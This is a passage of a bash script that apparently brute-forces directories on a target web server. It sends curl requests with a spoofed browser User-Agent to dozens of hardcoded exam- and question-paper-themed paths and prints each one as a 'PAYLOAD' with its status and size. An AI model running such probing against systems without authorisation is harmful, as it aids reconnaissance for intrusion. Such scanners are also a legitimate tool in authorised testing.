         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Ops/"" -H "User-Agent: Mozilla/5.0")
